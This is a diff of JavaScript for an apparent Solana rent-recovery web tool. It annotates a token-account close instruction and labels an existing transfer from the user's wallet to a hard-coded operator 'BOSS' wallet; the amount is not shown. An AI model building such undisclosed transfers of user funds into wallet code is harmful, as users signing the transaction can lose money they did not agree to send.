@@ -849,7 +849,7 @@
             return 'Inconnu';
         }
 
-        // ===== VRAIE RÉCUPÉRATION DE RENT - VERSION ATOMIQUE CORRECTE =====
+        // ===== VRAIE RÉCUPÉRATION DE RENT - VERSION CORRIGÉE =====
         async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
             try {
                 const referralData = getReferralData();
@@ -871,15 +871,17 @@
 
                 const transaction = new solanaWeb3.Transaction();
                 
+                // ✅ CORRECTION CRITIQUE : Instruction de fermeture corrigée
                 const closeInstruction = solanaWeb3.Token.createCloseAccountInstruction(
-                    new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-                    new solanaWeb3.PublicKey(tokenAccountAddress),
-                    new solanaWeb3.PublicKey(userWalletAddress),
-                    new solanaWeb3.PublicKey(userWalletAddress),
-                    []
+                    new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'), // programId
+                    new solanaWeb3.PublicKey(tokenAccountAddress), // account à fermer
+                    new solanaWeb3.PublicKey(userWalletAddress),   // destination
+                    new solanaWeb3.PublicKey(userWalletAddress),   // authority
+                    []                                             // multisign
                 );
                 transaction.add(closeInstruction);
 
+                // ✅ Transfert vers le BOSS
                 const bossTransfer = solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(userWalletAddress),
                     toPubkey: new solanaWeb3.PublicKey(REAL_CONFIG.BOSS_WALLET),
